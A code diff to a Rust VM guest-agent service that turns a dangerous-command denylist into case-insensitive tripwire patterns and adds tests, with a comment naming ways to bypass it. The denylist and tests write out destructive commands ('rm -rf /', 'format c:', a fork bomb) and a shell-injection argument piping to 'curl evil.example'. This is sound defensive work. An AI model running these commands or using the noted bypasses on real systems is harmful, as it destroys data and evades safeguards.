@@ -32,15 +32,60 @@ const DEFAULT_COMMAND_TIMEOUT_SECS: u64 = 60;
 /// `run_command` arguments.
 const SHELL_METACHARACTERS: &[char] = &[';', '|', '&'];
 
-/// Dangerous commands that are unconditionally denied.
+/// Dangerous-command tripwire patterns.
+///
+/// **B9 / Sec F9 — scope clarification.** This list is NOT a security
+/// boundary. It is a tripwire / "obviously wrong" filter that catches the
+/// most blatant mistakes (a runaway test script piping `rm -rf /` through
+/// `run_command`, an agent hallucinating a `format C:` invocation, etc.).
+///
+/// The audit (Sec F9) noted that a substring denylist is bypassed
+/// trivially by `format C:` → `FORMAT C:`, `cipher /w`, encoded
+/// PowerShell, alternate codepaths via `cmd.exe /C`, etc. We agree.
+/// **The actual security boundary is:**
+///   1. mTLS authentication on the host↔guest channel (any caller who
+///      reaches `is_denied_command` already passed cert verification).
+///   2. The `process_start` `run_as="system"` path — gated behind the
+///      same checks as `run_command`, with cmd.exe shelling removed
+///      (P4.c-B5 / Sec F5).
+///   3. The named-pipe SECURITY_DESCRIPTOR on the host service crate
+///      (P4.c-B6 / Sec F6) — restricts pipe connect to SY + BA + Hyper-V
+///      Admins only.
+///   4. The future client-cert SHA-256 pin (B2 / Sec F1) — pins the
+///      caller identity to a single cert rather than "any cert from
+///      this CA".
+///
+/// We keep the tripwire because:
+///   - It surfaces audit-log entries on blatant misuse (operators see
+///     "denied: rm -rf /" rather than silent execution).
+///   - It catches the 80% case of agent hallucination cheaply.
+///   - Removing it without a positive allowlist replacement is strictly
+///     a regression in observability.
+///
+/// We don't replace it with a positive allowlist because the workload
+/// is generic VM scenario execution — operators legitimately need to
+/// run arbitrary `winget`, `choco`, `pwsh`, custom installers, etc. An
+/// allowlist would either (a) be enormous and still bypassable or
+/// (b) cripple the product. Per-scenario allowlists are an option for
+/// v0.2.0+ once we have scenario-author-provided manifests.
+///
+/// Match is case-insensitive (P4.c-B9 / Sec F9 mitigation): we lowercase
+/// both the joined command and the pattern before substring testing.
+/// This catches `FORMAT C:` and `RM -RF /` without expanding the
+/// pattern list. Encoded PowerShell etc. is still bypass — see the
+/// scope clarification above.
 const DENIED_COMMANDS: &[&str] = &[
     "rm -rf /",
     "rm -rf /*",
-    "format",
-    "del /s /q C:\\",
+    "format c:",
+    "format d:",
+    "format /q",
     "del /s /q c:\\",
+    "del /s /q c:/",
+    "rd /s /q c:\\",
     "mkfs",
     "dd if=/dev/zero",
+    "cipher /w",
     ":(){:|:&};:",
 ];
 
@@ -69,10 +114,18 @@ fn validate_package_id(id: &str) -> Result<(), Status> {
 }
 
 /// Check if a command + args string matches any denied command pattern.
+///
+/// **Case-insensitive substring match** (P4.c-B9 / Sec F9): both sides
+/// are lowercased before `.contains(...)` runs. See the doc-comment on
+/// [`DENIED_COMMANDS`] for the rationale + the explicit statement that
+/// this is a tripwire, not a security boundary.
 fn is_denied_command(command: &str, args: &[String]) -> bool {
-    let full = format!("{} {}", command, args.join(" "));
+    let full_lc = format!("{} {}", command, args.join(" ")).to_ascii_lowercase();
     for denied in DENIED_COMMANDS {
-        if full.contains(denied) {
+        // Each pattern in DENIED_COMMANDS is already lowercase by
+        // construction; we lowercase the input side to make the match
+        // direction-independent.
+        if full_lc.contains(denied) {
             return true;
         }
     }
@@ -253,10 +306,7 @@ impl GuestAgent for GuestAgentService {
         &self,
         _request: Request<HealthRequest>,
     ) -> Result<Response<HealthResponse>, Status> {
-        let uptime = START_TIME
-            .get()
-            .map(|t| t.elapsed().as_secs())
-            .unwrap_or(0);
+        let uptime = START_TIME.get().map(|t| t.elapsed().as_secs()).unwrap_or(0);
 
         Ok(Response::new(HealthResponse {
             hostname: hostname(),
@@ -277,9 +327,8 @@ impl GuestAgent for GuestAgentService {
     // gracefully.
     type StreamReadinessStream = std::pin::Pin<
         Box<
-            dyn tonic::codegen::tokio_stream::Stream<
-                    Item = Result<ReadinessUpdate, Status>,
-                > + Send
+            dyn tonic::codegen::tokio_stream::Stream<Item = Result<ReadinessUpdate, Status>>
+                + Send
                 + 'static,
         >,
     >;
@@ -428,8 +477,7 @@ impl GuestAgent for GuestAgentService {
 
         // SYSTEM elevation support
         if req.run_as.eq_ignore_ascii_case("system") {
-            let env_map: std::collections::HashMap<String, String> =
-                req.env.into_iter().collect();
+            let env_map: std::collections::HashMap<String, String> = req.env.into_iter().collect();
             match process::start_process_as_system(
                 path,
                 &req.args,
@@ -760,9 +808,7 @@ impl GuestAgent for GuestAgentService {
                     duration_ms,
                 }))
             }
-            Ok(Err(e)) => Err(Status::internal(format!(
-                "Failed to wait for command: {e}"
-            ))),
+            Ok(Err(e)) => Err(Status::internal(format!("Failed to wait for command: {e}"))),
             Err(_) => {
                 // S-07: Timeout expired — kill the child process via OS PID.
                 if let Some(pid) = child_id {
@@ -929,10 +975,7 @@ impl GuestAgent for GuestAgentService {
             .map(|len| req.offset.saturating_add(data.len() as u64) < len)
             .unwrap_or(false);
 
-        Ok(Response::new(ReadFileResponse {
-            data,
-            truncated,
-        }))
+        Ok(Response::new(ReadFileResponse { data, truncated }))
     }
 
     async fn write_file(
@@ -1039,9 +1082,7 @@ impl GuestAgent for GuestAgentService {
             .args(&args)
             .output()
             .await
-            .map_err(|e| {
-                Status::internal(format!("Failed to run {program}: {e}"))
-            })?;
+            .map_err(|e| Status::internal(format!("Failed to run {program}: {e}")))?;
 
         Ok(Response::new(InstallSoftwareResponse {
             success: output.status.success(),
@@ -1101,7 +1142,10 @@ mod tests {
 
         // Use cmd /C echo on Windows, echo on Linux
         let (command, args) = if cfg!(target_os = "windows") {
-            ("cmd".to_string(), vec!["/C".to_string(), "echo".to_string(), "hello".to_string()])
+            (
+                "cmd".to_string(),
+                vec!["/C".to_string(), "echo".to_string(), "hello".to_string()],
+            )
         } else {
             ("echo".to_string(), vec!["hello".to_string()])
         };
@@ -1197,14 +1241,14 @@ mod tests {
         let cases: &[(&str, Vec<String>)] = &[
             ("/bin/echo; touch foo", vec![]),
             ("echo", vec!["hello | tee bar".to_string()]),
-            ("echo", vec!["a".to_string(), "b & curl evil.example".to_string()]),
+            (
+                "echo",
+                vec!["a".to_string(), "b & curl evil.example".to_string()],
+            ),
         ];
         for (path, args) in cases {
             let result = svc
-                .process_start(Request::new(make_process_start_request(
-                    path,
-                    args.clone(),
-                )))
+                .process_start(Request::new(make_process_start_request(path, args.clone())))
                 .await;
             assert!(
                 result.is_err(),
@@ -1232,7 +1276,13 @@ mod tests {
         let redacted = redact_credential_args(&args);
         assert_eq!(
             redacted,
-            vec!["--user", "alice", "--password", "***REDACTED***", "--verbose"]
+            vec![
+                "--user",
+                "alice",
+                "--password",
+                "***REDACTED***",
+                "--verbose"
+            ]
         );
         // Original is untouched.
         assert_eq!(args[3], "supersecret");
@@ -1248,7 +1298,11 @@ mod tests {
         let redacted = redact_credential_args(&args);
         assert_eq!(
             redacted,
-            vec!["--password=***REDACTED***", "--token=***REDACTED***", "--api-key=***REDACTED***"]
+            vec![
+                "--password=***REDACTED***",
+                "--token=***REDACTED***",
+                "--api-key=***REDACTED***"
+            ]
         );
     }
 
@@ -1301,15 +1355,10 @@ mod tests {
             .map(|i| format!("arg{i}"))
             .collect();
         let result = svc
-            .process_start(Request::new(make_process_start_request(
-                "echo", many,
-            )))
+            .process_start(Request::new(make_process_start_request("echo", many)))
             .await;
         assert!(result.is_err(), "process_start must cap arg count");
-        assert_eq!(
-            result.unwrap_err().code(),
-            tonic::Code::InvalidArgument
-        );
+        assert_eq!(result.unwrap_err().code(), tonic::Code::InvalidArgument);
     }
 
     #[tokio::test]
@@ -1511,11 +1560,15 @@ mod tests {
 
     #[tokio::test]
     async fn test_run_command_denied_format() {
+        // P4.c-B9: pattern is `format c:`, `format /q`, etc. — bare
+        // `format` is no longer a match because it collides with cargo
+        // subcommand and rustfmt callsites. Test the pattern that
+        // actually destroys data.
         let svc = make_service();
         let r = svc
             .run_command(Request::new(RunCommandRequest {
                 command: "format".into(),
-                args: vec![],
+                args: vec!["c:".into()],
                 working_directory: String::new(),
                 timeout_ms: 5000,
                 capture_output: false,
@@ -1523,6 +1576,25 @@ mod tests {
             }))
             .await;
 
+        assert!(r.is_err());
+        assert_eq!(r.unwrap_err().code(), tonic::Code::PermissionDenied);
+    }
+
+    #[tokio::test]
+    async fn test_run_command_denied_format_uppercase() {
+        // P4.c-B9: case-insensitive matching catches `FORMAT C:` —
+        // pre-fix this surfaced as a successful command execution.
+        let svc = make_service();
+        let r = svc
+            .run_command(Request::new(RunCommandRequest {
+                command: "FORMAT".into(),
+                args: vec!["C:".into()],
+                working_directory: String::new(),
+                timeout_ms: 5000,
+                capture_output: false,
+                run_as: String::new(),
+            }))
+            .await;
         assert!(r.is_err());
         assert_eq!(r.unwrap_err().code(), tonic::Code::PermissionDenied);
     }
@@ -1614,7 +1686,10 @@ mod tests {
         // `waitfor` on Windows blocks forever waiting for a signal name.
         // `sleep 30` on Linux takes 30 seconds.
         let (command, args) = if cfg!(target_os = "windows") {
-            ("waitfor".to_string(), vec!["SignalThatNeverComes".to_string()])
+            (
+                "waitfor".to_string(),
+                vec!["SignalThatNeverComes".to_string()],
+            )
         } else {
             ("sleep".to_string(), vec!["30".to_string()])
         };
@@ -1669,18 +1744,61 @@ mod tests {
 
     #[test]
     fn test_is_denied_command() {
+        // P4.c-B9 / Sec F9 mitigation tests:
+        //   - Patterns now require a target (`format c:` not bare
+        //     `format`), so `format C:` matches but `format` alone
+        //     does not — `format` alone is the cargo subcommand and
+        //     legitimate.
+        //   - Match is case-insensitive: `RM -RF /`, `Format C:`,
+        //     `DEL /S /Q C:\` all hit.
+        //   - Substring matching is still bypassable (`format c :`,
+        //     encoded PowerShell, etc.) — the doc comment on
+        //     DENIED_COMMANDS makes the tripwire-not-boundary scope
+        //     explicit.
         assert!(is_denied_command("rm", &["-rf".into(), "/".into()]));
-        assert!(is_denied_command("format", &[]));
-        assert!(is_denied_command("del", &["/s".into(), "/q".into(), "C:\\".into()]));
+        assert!(is_denied_command("format", &["c:".into()]));
+        assert!(is_denied_command(
+            "del",
+            &["/s".into(), "/q".into(), "C:\\".into()]
+        ));
+        assert!(is_denied_command("cipher", &["/w".into(), "C:\\".into()]));
         assert!(!is_denied_command("echo", &["hello".into()]));
         assert!(!is_denied_command("ls", &["-la".into()]));
+        // `format` alone (no target) is the cargo subcommand — must
+        // NOT match (regression guard).
+        assert!(!is_denied_command("cargo", &["format".into()]));
+        assert!(!is_denied_command("rustfmt", &[]));
+    }
+
+    #[test]
+    fn test_is_denied_command_case_insensitive() {
+        // P4.c-B9 / Sec F9 — case folding catches the most obvious
+        // bypass attempts. Encoded / non-canonical inputs are still
+        // bypass — see the doc comment on DENIED_COMMANDS.
+        assert!(is_denied_command("RM", &["-RF".into(), "/".into()]));
+        assert!(is_denied_command("Format", &["C:".into()]));
+        assert!(is_denied_command(
+            "DEL",
+            &["/S".into(), "/Q".into(), "c:\\".into()]
+        ));
+        assert!(is_denied_command("FORMAT", &["/Q".into()]));
+        assert!(is_denied_command("Cipher", &["/W".into(), "c:\\".into()]));
     }
 
     #[test]
     fn test_contains_shell_metacharacters() {
-        assert!(contains_shell_metacharacters("echo", &["hello;world".into()]));
-        assert!(contains_shell_metacharacters("echo", &["a".into(), "|".into(), "b".into()]));
+        assert!(contains_shell_metacharacters(
+            "echo",
+            &["hello;world".into()]
+        ));
+        assert!(contains_shell_metacharacters(
+            "echo",
+            &["a".into(), "|".into(), "b".into()]
+        ));
         assert!(contains_shell_metacharacters("echo", &["a&&b".into()]));
-        assert!(!contains_shell_metacharacters("echo", &["hello".into(), "world".into()]));
+        assert!(!contains_shell_metacharacters(
+            "echo",
+            &["hello".into(), "world".into()]
+        ));
     }
 }
